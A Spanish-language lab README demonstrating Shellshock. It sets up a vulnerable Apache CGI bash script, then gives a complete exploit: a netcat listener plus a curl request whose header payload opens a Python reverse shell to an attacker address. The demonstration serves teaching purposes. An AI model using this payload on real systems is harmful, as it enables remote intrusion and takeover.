# Shellshock-Demo

# Requisitos 

- Ubuntu 14.04.1 (http://releases.ubuntu.com/14.04.1)
- Apache Server (Cualquiera)
- Curl (Cualquiera)

# Proceso

1. Instalar Apache Server y Curl
```
$ sudo apt-get install apache2 curl
```

2. Activar el modulo CGI de Apache
```
$ cd /etc/apache2/mods-enabled
$ sudo ln -s ../mods-available/cgi.load
```

3. Reiniciar Apache 

```
$ sudo service apache2 reload
```

4. Crear script en los directorios de CGI
```
nano /usr/lib/cgi-bin/test.sh

Pegar el contenido

#!/bin/bash
printf "Content-type: text/html\n\n"
printf "Holis!"

Hacerlo ejecutable
$ sudo chmod +x /usr/lib/cgi-bin/test.sh
```

5. Visitar el script para ver el funcionamiento normal

```
localhost/cgi-bin/test.sh

o con curl

$ curl localhost/cgi-bin/test.sh
```

6. Hacer llamada al script con el payload de shellshock

En maquina de ataque:

```
$ nc -lvp 4242

# En otra terminal
$ curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"192.168.139.1\",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://192.168.139.128/cgi-bin/test.sh
```
